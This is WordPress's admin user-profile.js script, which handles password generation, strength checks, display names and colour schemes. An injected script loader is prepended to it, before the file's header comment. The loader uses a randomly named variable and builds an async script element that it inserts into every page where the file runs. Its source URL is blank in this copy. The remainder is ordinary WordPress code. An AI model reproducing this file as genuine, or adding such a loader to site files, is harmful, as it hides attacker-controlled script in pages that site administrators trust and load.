var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * @output wp-admin/js/user-profile.js
 */

/* global ajaxurl, pwsL10n, userProfileL10n */
(function($) {
	var updateLock = false,

		$pass1Row,
		$pass1Wrap,
		$pass1,
		$pass1Text,
		$pass1Label,
		$pass2,
		$weakRow,
		$weakCheckbox,
		$toggleButton,
		$submitButtons,
		$submitButton,
		currentPass;

	function generatePassword() {
		if ( typeof zxcvbn !== 'function' ) {
			setTimeout( generatePassword, 50 );
			return;
		} else if ( ! $pass1.val() ) {
			// zxcvbn loaded before user entered password.
			$pass1.val( $pass1.data( 'pw' ) );
			$pass1.trigger( 'pwupdate' );
			showOrHideWeakPasswordCheckbox();
		}
		else {
			// zxcvbn loaded after the user entered password, check strength.
			check_pass_strength();
			showOrHideWeakPasswordCheckbox();
		}

		if ( 1 !== parseInt( $toggleButton.data( 'start-masked' ), 10 ) ) {
			$pass1Wrap.addClass( 'show-password' );
		} else {
			$toggleButton.trigger( 'click' );
		}

		// Once zxcvbn loads, passwords strength is known.
		$( '#pw-weak-text-label' ).html( userProfileL10n.warnWeak );
	}

	function bindPass1() {
		currentPass = $pass1.val();

		$pass1Wrap = $pass1.parent();

		$pass1Text = $( '<input type="text"/>' )
			.attr( {
				'id':           'pass1-text',
				'name':         'pass1-text',
				'autocomplete': 'off'
			} )
			.addClass( $pass1[0].className )
			.data( 'pw', $pass1.data( 'pw' ) )
			.val( $pass1.val() )
			.on( 'input', function () {
				if ( $pass1Text.val() === currentPass ) {
					return;
				}
				$pass2.val( $pass1Text.val() );
				$pass1.val( $pass1Text.val() ).trigger( 'pwupdate' );
				currentPass = $pass1Text.val();
			} );

		$pass1.after( $pass1Text );

		if ( 1 === parseInt( $pass1.data( 'reveal' ), 10 ) ) {
			generatePassword();
		}

		$pass1.on( 'input' + ' pwupdate', function () {
			if ( $pass1.val() === currentPass ) {
				return;
			}

			currentPass = $pass1.val();
			if ( $pass1Text.val() !== currentPass ) {
				$pass1Text.val( currentPass );
			}
			$pass1.add( $pass1Text ).removeClass( 'short bad good strong' );
			showOrHideWeakPasswordCheckbox();
		} );
	}

	function resetToggle() {
		$toggleButton
			.data( 'toggle', 0 )
			.attr({
				'aria-label': userProfileL10n.ariaHide
			})
			.find( '.text' )
				.text( userProfileL10n.hide )
			.end()
			.find( '.dashicons' )
				.removeClass( 'dashicons-visibility' )
				.addClass( 'dashicons-hidden' );

		$pass1Text.focus();

		$pass1Label.attr( 'for', 'pass1-text' );
	}

	function bindToggleButton() {
		$toggleButton = $pass1Row.find('.wp-hide-pw');
		$toggleButton.show().on( 'click', function () {
			if ( 1 === parseInt( $toggleButton.data( 'toggle' ), 10 ) ) {
				$pass1Wrap.addClass( 'show-password' );

				resetToggle();

				if ( ! _.isUndefined( $pass1Text[0].setSelectionRange ) ) {
					$pass1Text[0].setSelectionRange( 0, 100 );
				}
			} else {
				$pass1Wrap.removeClass( 'show-password' );
				$toggleButton
					.data( 'toggle', 1 )
					.attr({
						'aria-label': userProfileL10n.ariaShow
					})
					.find( '.text' )
						.text( userProfileL10n.show )
					.end()
					.find( '.dashicons' )
						.removeClass('dashicons-hidden')
						.addClass('dashicons-visibility');

				$pass1.focus();

				$pass1Label.attr( 'for', 'pass1' );

				if ( ! _.isUndefined( $pass1[0].setSelectionRange ) ) {
					$pass1[0].setSelectionRange( 0, 100 );
				}
			}
		});
	}

	function bindPasswordForm() {
		var $passwordWrapper,
			$generateButton,
			$cancelButton;

		$pass1Row = $('.user-pass1-wrap');
		$pass1Label = $pass1Row.find('th label').attr( 'for', 'pass1-text' );

		// hide this
		$('.user-pass2-wrap').hide();

		$submitButton = $( '#submit, #wp-submit' ).on( 'click', function () {
			updateLock = false;
		});

		$submitButtons = $submitButton.add( ' #createusersub' );

		$weakRow = $( '.pw-weak' );
		$weakCheckbox = $weakRow.find( '.pw-checkbox' );
		$weakCheckbox.change( function() {
			$submitButtons.prop( 'disabled', ! $weakCheckbox.prop( 'checked' ) );
		} );

		$pass1 = $('#pass1');
		if ( $pass1.length ) {
			bindPass1();
		}

		/**
		 * Fix a LastPass mismatch issue, LastPass only changes pass2.
		 *
		 * This fixes the issue by copying any changes from the hidden
		 * pass2 field to the pass1 field, then running check_pass_strength.
		 */
		$pass2 = $( '#pass2' ).on( 'input', function () {
			if ( $pass2.val().length > 0 ) {
				$pass1.val( $pass2.val() );
				$pass2.val('');
				currentPass = '';
				$pass1.trigger( 'pwupdate' );
			}
		} );

		// Disable hidden inputs to prevent autofill and submission.
		if ( $pass1.is( ':hidden' ) ) {
			$pass1.prop( 'disabled', true );
			$pass2.prop( 'disabled', true );
			$pass1Text.prop( 'disabled', true );
		}

		$passwordWrapper = $pass1Row.find( '.wp-pwd' );
		$generateButton  = $pass1Row.find( 'button.wp-generate-pw' );

		bindToggleButton();

		if ( $generateButton.length ) {
			$passwordWrapper.hide();
		}

		$generateButton.show();
		$generateButton.on( 'click', function () {
			updateLock = true;

			$generateButton.hide();
			$passwordWrapper.show();

			// Enable the inputs when showing.
			$pass1.attr( 'disabled', false );
			$pass2.attr( 'disabled', false );
			$pass1Text.attr( 'disabled', false );

			if ( $pass1Text.val().length === 0 ) {
				generatePassword();
			}

			_.defer( function() {
				$pass1Text.focus();
				if ( ! _.isUndefined( $pass1Text[0].setSelectionRange ) ) {
					$pass1Text[0].setSelectionRange( 0, 100 );
				}
			}, 0 );
		} );

		$cancelButton = $pass1Row.find( 'button.wp-cancel-pw' );
		$cancelButton.on( 'click', function () {
			updateLock = false;

			// Clear any entered password.
			$pass1Text.val( '' );

			// Generate a new password.
			wp.ajax.post( 'generate-password' )
				.done( function( data ) {
					$pass1.data( 'pw', data );
				} );

			$generateButton.show().focus();
			$passwordWrapper.hide();

			$weakRow.hide( 0, function () {
				$weakCheckbox.removeProp( 'checked' );
			} );

			// Disable the inputs when hiding to prevent autofill and submission.
			$pass1.prop( 'disabled', true );
			$pass2.prop( 'disabled', true );
			$pass1Text.prop( 'disabled', true );

			resetToggle();

			if ( $pass1Row.closest( 'form' ).is( '#your-profile' ) ) {
				// Clear password field to prevent update
				$pass1.val( '' ).trigger( 'pwupdate' );
				$submitButtons.prop( 'disabled', false );
			}
		} );

		$pass1Row.closest( 'form' ).on( 'submit', function () {
			updateLock = false;

			$pass1.prop( 'disabled', false );
			$pass2.prop( 'disabled', false );
			$pass2.val( $pass1.val() );
			$pass1Wrap.removeClass( 'show-password' );
		});
	}

	function check_pass_strength() {
		var pass1 = $('#pass1').val(), strength;

		$('#pass-strength-result').removeClass('short bad good strong');
		if ( ! pass1 ) {
			$('#pass-strength-result').html( '&nbsp;' );
			return;
		}

		strength = wp.passwordStrength.meter( pass1, wp.passwordStrength.userInputBlacklist(), pass1 );

		switch ( strength ) {
			case -1:
				$( '#pass-strength-result' ).addClass( 'bad' ).html( pwsL10n.unknown );
				break;
			case 2:
				$('#pass-strength-result').addClass('bad').html( pwsL10n.bad );
				break;
			case 3:
				$('#pass-strength-result').addClass('good').html( pwsL10n.good );
				break;
			case 4:
				$('#pass-strength-result').addClass('strong').html( pwsL10n.strong );
				break;
			case 5:
				$('#pass-strength-result').addClass('short').html( pwsL10n.mismatch );
				break;
			default:
				$('#pass-strength-result').addClass('short').html( pwsL10n['short'] );
		}
	}

	function showOrHideWeakPasswordCheckbox() {
		var passStrength = $('#pass-strength-result')[0];

		if ( passStrength.className ) {
			$pass1.add( $pass1Text ).addClass( passStrength.className );
			if ( $( passStrength ).is( '.short, .bad' ) ) {
				if ( ! $weakCheckbox.prop( 'checked' ) ) {
					$submitButtons.prop( 'disabled', true );
				}
				$weakRow.show();
			} else {
				$submitButtons.prop( 'disabled', false );
				$weakRow.hide();
			}
		}
	}

	$(document).ready( function() {
		var $colorpicker, $stylesheet, user_id, current_user_id,
			select       = $( '#display_name' ),
			current_name = select.val(),
			greeting     = $( '#wp-admin-bar-my-account' ).find( '.display-name' );

		$( '#pass1' ).val( '' ).on( 'input' + ' pwupdate', check_pass_strength );
		$('#pass-strength-result').show();
		$('.color-palette').click( function() {
			$(this).siblings('input[name="admin_color"]').prop('checked', true);
		});

		if ( select.length ) {
			$('#first_name, #last_name, #nickname').bind( 'blur.user_profile', function() {
				var dub = [],
					inputs = {
						display_nickname  : $('#nickname').val() || '',
						display_username  : $('#user_login').val() || '',
						display_firstname : $('#first_name').val() || '',
						display_lastname  : $('#last_name').val() || ''
					};

				if ( inputs.display_firstname && inputs.display_lastname ) {
					inputs.display_firstlast = inputs.display_firstname + ' ' + inputs.display_lastname;
					inputs.display_lastfirst = inputs.display_lastname + ' ' + inputs.display_firstname;
				}

				$.each( $('option', select), function( i, el ){
					dub.push( el.value );
				});

				$.each(inputs, function( id, value ) {
					if ( ! value ) {
						return;
					}

					var val = value.replace(/<\/?[a-z][^>]*>/gi, '');

					if ( inputs[id].length && $.inArray( val, dub ) === -1 ) {
						dub.push(val);
						$('<option />', {
							'text': val
						}).appendTo( select );
					}
				});
			});

			/**
			 * Replaces "Howdy, *" in the admin toolbar whenever the display name dropdown is updated for one's own profile.
			 */
			select.on( 'change', function() {
				if ( user_id !== current_user_id ) {
					return;
				}

				var display_name = $.trim( this.value ) || current_name;

				greeting.text( display_name );
			} );
		}

		$colorpicker = $( '#color-picker' );
		$stylesheet = $( '#colors-css' );
		user_id = $( 'input#user_id' ).val();
		current_user_id = $( 'input[name="checkuser_id"]' ).val();

		$colorpicker.on( 'click.colorpicker', '.color-option', function() {
			var colors,
				$this = $(this);

			if ( $this.hasClass( 'selected' ) ) {
				return;
			}

			$this.siblings( '.selected' ).removeClass( 'selected' );
			$this.addClass( 'selected' ).find( 'input[type="radio"]' ).prop( 'checked', true );

			// Set color scheme
			if ( user_id === current_user_id ) {
				// Load the colors stylesheet.
				// The default color scheme won't have one, so we'll need to create an element.
				if ( 0 === $stylesheet.length ) {
					$stylesheet = $( '<link rel="stylesheet" />' ).appendTo( 'head' );
				}
				$stylesheet.attr( 'href', $this.children( '.css_url' ).val() );

				// repaint icons
				if ( typeof wp !== 'undefined' && wp.svgPainter ) {
					try {
						colors = $.parseJSON( $this.children( '.icon_colors' ).val() );
					} catch ( error ) {}

					if ( colors ) {
						wp.svgPainter.setColors( colors );
						wp.svgPainter.paint();
					}
				}

				// update user option
				$.post( ajaxurl, {
					action:       'save-user-color-scheme',
					color_scheme: $this.children( 'input[name="admin_color"]' ).val(),
					nonce:        $('#color-nonce').val()
				}).done( function( response ) {
					if ( response.success ) {
						$( 'body' ).removeClass( response.data.previousScheme ).addClass( response.data.currentScheme );
					}
				});
			}
		});

		bindPasswordForm();
	});

	$( '#destroy-sessions' ).on( 'click', function( e ) {
		var $this = $(this);

		wp.ajax.post( 'destroy-sessions', {
			nonce: $( '#_wpnonce' ).val(),
			user_id: $( '#user_id' ).val()
		}).done( function( response ) {
			$this.prop( 'disabled', true );
			$this.siblings( '.notice' ).remove();
			$this.before( '<div class="notice notice-success inline"><p>' + response.message + '</p></div>' );
		}).fail( function( response ) {
			$this.siblings( '.notice' ).remove();
			$this.before( '<div class="notice notice-error inline"><p>' + response.message + '</p></div>' );
		});

		e.preventDefault();
	});

	window.generatePassword = generatePassword;

	/* Warn the user if password was generated but not saved */
	$( window ).on( 'beforeunload', function () {
		if ( true === updateLock ) {
			return userProfileL10n.warn;
		}
	} );

})(jQuery);
